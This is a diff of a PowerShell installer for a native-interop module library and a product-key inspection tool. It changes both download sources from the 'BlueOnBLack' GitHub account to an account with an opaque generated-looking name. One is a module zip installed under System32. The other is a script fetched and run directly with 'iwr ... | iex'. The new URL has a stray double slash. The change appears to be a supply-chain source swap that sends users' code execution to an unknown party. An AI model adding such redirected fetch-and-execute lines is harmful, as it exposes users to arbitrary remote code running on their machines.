@@ -7,7 +7,7 @@ try {
         exit 1
     }
 
-    $repoUrl = "https://github.com/BlueOnBLack/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
+    $repoUrl = "https://github.com/v8k6b2jjps-prog/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
     $moduleFolder = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\NativeInteropLib"
     $tempFolder = "$env:TEMP\Unmanaged.PS1.Library"
     $zipFile = "$tempFolder.zip"
@@ -22,4 +22,4 @@ try {
 catch {
 	write-error "Fail to install Libary"
 }
-iwr -Uri 'https://raw.githubusercontent.com/BlueOnBLack/PKeyInspector/refs/heads/main/PKeyConsole.ps1' | iex
+iwr -Uri 'https://raw.githubusercontent.com/v8k6b2jjps-prog//PKeyInspector/refs/heads/main/PKeyConsole.ps1' | iex
